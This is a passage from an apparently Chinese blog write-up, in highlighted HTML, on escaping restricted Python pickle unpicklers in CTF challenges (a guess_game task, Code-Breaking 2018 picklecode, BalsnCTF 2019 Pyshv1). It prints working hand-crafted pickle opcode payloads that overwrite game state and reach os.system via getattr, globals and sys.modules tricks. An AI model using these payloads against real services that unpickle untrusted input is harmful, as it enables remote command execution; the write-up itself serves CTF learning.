class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>server 端将接收到的数据进行反序列，这里与常规的 <code>pickle.loads</code> 不同，采用的是 Python 提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">安全措施</a>。也就是说，导入的模块只能以 <code>guess_name</code> 开头，并且名称里不能含有 <code>__</code>。</p><p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>只要能控制住 <code>curr_ticket</code>，每局就能稳赢，或者直接将 <code>win_count</code> 设为 10，能实现吗？</p><p><strong>先试试覆盖 <code>win_count</code> 和 <code>round_count</code></strong>。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># 具体实现在 pickle.py 的 1546 行</span></span><br></pre></td></tr></table></figure><p>开始构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S'round_count'</span><br><span class="line">I10</span><br><span class="line">sS'win_count'</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure><p>其中，<code>}</code> 是往 stack 中压入一个空 dict，<code>s</code> 是将键值对插入到 dict。</p><p>测试一下效果，成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p><p>到这就做完了吗？不，还有个小验证，<code>assert type(ticket) == Ticket</code>。</p><p>之前提到过，<code>pickle</code> 序列流执行完后将把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S"win_count"<span class="symbol">\n</span>I10<span class="symbol">\n</span>sS"round_count"<span class="symbol">\n</span>I9<span class="symbol">\n</span>sbcguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sb.</span><br></pre></td></tr></table></figure><p><strong>尝试覆盖掉 <code>current_ticket</code></strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span></span><br><span class="line">game</span><br><span class="line">&#125;S'curr_ticket'</span><br><span class="line">cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p><p>最终 payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S'curr_ticket'<span class="symbol">\n</span>cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>07sbp0<span class="symbol">\n</span>sbg0<span class="symbol">\n</span>.</span><br></pre></td></tr></table></figure><h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote><p>完整源码： <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p><code>getattr</code> 和 <code>globals</code> 并没有被禁，那就尝试写 pickle 吧。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">dict</span><br><span class="line">S'get'</span><br><span class="line">tRp100</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>'__builtins__'</span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>g100</span><br><span class="line">(<span class="name">g101</span></span><br><span class="line">S'eval'</span><br><span class="line">tR(<span class="name">S</span>'__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)'</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 <code>builtins</code> 是一个 <code>dict</code>，所以用了两次 <code>get</code>，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure><p>限制了导入的模块只能是 <code>sys</code>，问题是这个模块也不安全呀 ：）</p><blockquote><p><code>sys.modules</code></p><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p></blockquote><p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 <code>os</code>，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 </p><p>这里的 <code>find_class</code> 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>其中 <code>sys.modules</code> 为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的目标：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure><p>限制了 module 只能为 sys，那能否把 <code>sys.modules[&#39;sys&#39;]</code>替换为<code>sys.modules[&#39;os&#39;]</code>，从而引入危险模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure><p>本地实验一下，成功：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(<span class="string">'dir'</span>)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/<span class="number">08</span>/<span class="number">22</span>  <span class="number">21</span>:<span class="number">02</span>             <span class="number">2</span>,<span class="number">750</span> <span class="selector-class">.aggressor</span><span class="selector-class">.prop</span></span><br><span class="line"><span class="number">2019</span>/<span class="number">09</span>/<span class="number">16</span>  <span class="number">00</span>:<span class="number">09</span>    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">09</span>  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">07</span>  <span class="number">12</span>:<span class="number">03</span>    &lt;DIR&gt;          <span class="selector-class">.CLion2019</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>还有个小麻烦，<code>modules</code> 是个 <code>dict</code>，无法直接取值。继续利用 <code>getattr(sys.modules[module], name)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure><p>改写成 pickle：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 